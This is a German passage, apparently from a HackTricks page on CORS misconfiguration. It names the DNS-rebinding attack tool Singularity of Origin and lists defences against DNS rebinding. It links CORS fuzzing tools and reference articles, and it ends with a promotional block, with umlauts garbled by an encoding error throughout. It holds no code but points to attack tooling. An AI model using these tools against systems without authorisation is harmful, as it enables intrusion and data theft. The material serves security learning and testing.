[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ist ein Tool zur Durchf√ºhrung von [DNS-Rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding)-Angriffen. Es enth√§lt die erforderlichen Komponenten, um die IP-Adresse des Angriffsservers-DNS-Namens an die IP-Adresse der Zielmaschine zu binden und Angriffspayloads bereitzustellen, um verwundbare Software auf der Zielmaschine auszunutzen.

### Echter Schutz gegen DNS-Rebinding

* Verwenden Sie TLS in internen Diensten.
* Fordern Sie zur Datenzugriff Authentifizierung an.
* √úberpr√ºfen Sie den Host-Header.
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Vorschlag, immer eine Vorab-Anfrage zu senden, wenn √∂ffentliche Server auf interne Server zugreifen m√∂chten.

## **Tools**

**Fuzz m√∂gliche Fehlkonfigurationen in CORS-Richtlinien**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Referenzen
* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
